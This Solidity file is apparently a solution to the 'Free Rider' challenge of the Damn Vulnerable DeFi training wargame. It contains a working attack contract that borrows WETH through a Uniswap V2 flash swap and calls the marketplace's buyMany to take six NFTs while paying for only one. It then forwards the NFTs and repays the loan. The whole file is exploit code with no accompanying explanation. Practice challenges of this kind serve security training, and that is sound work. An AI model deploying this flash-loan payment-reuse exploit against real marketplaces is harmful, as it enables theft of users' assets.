// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Pair {
    // token0 = weth
    // token1 = DVT
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWeth {
    function transfer(address recipient, uint amount) external returns (bool);
    function withdraw(uint amount) external;
    function deposit() external payable;
    function balanceOf(address) external returns (uint);
}

contract AttackFreeRider {
    DamnValuableNFT nft;
    IWeth public weth;
    FreeRiderNFTMarketplace freeRiderNftMarket;
    IUniswapV2Pair uniswapV2Pair;
    address buyer;
    uint256 nftPrice = 15 ether;

    uint256[] public tokenIds = [0,1,2,3,4,5];

    constructor(
        DamnValuableNFT _nft,
        IWeth _weth,
        FreeRiderNFTMarketplace _freeRiderNftMarket,
        IUniswapV2Pair _uniswapV2Pair,
        address _buyer
    ) {
        nft = _nft;
        weth = _weth;
        freeRiderNftMarket = _freeRiderNftMarket;
        uniswapV2Pair = _uniswapV2Pair;
        buyer = _buyer;
    }

    // Trigger flash swap
    function attack(uint256 amount) public {
        // Pass some data to trigger uniswapV2Call
        bytes memory data = "ATTACK";
        uniswapV2Pair.swap(amount, 0, address(this), data);
    }

    // Uniswap callback after receiving flash swap
    function uniswapV2Call(address, uint, uint, bytes calldata) public {
        // Unwrap Ether
        weth.withdraw(nftPrice);

        // Buy 6 nft from FreeRiderNFTMarketplace
        freeRiderNftMarket.buyMany{value: nftPrice}(tokenIds);

        // Transfer 6 NFT to buyer
        for( uint256 i = 0 ; i < tokenIds.length ; i++) {
            nft.safeTransferFrom(address(this), buyer, i); // Refer https://eips.ethereum.org/EIPS/eip-721 for safeTransferFrom
        }

        // Calculate 0.3% + some buffer wei amount for flash swap fee
        uint256 fee = ((nftPrice * 3) / 997) + 1;
        uint256 amountToPay = nftPrice + fee;

         // Wrap Ether
        weth.deposit{ value: amountToPay }();

        // Repay flash swap loan
        weth.transfer(address(uniswapV2Pair), amountToPay);           
    }

    // Receive NFT
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    } 

    receive() external payable {}
}
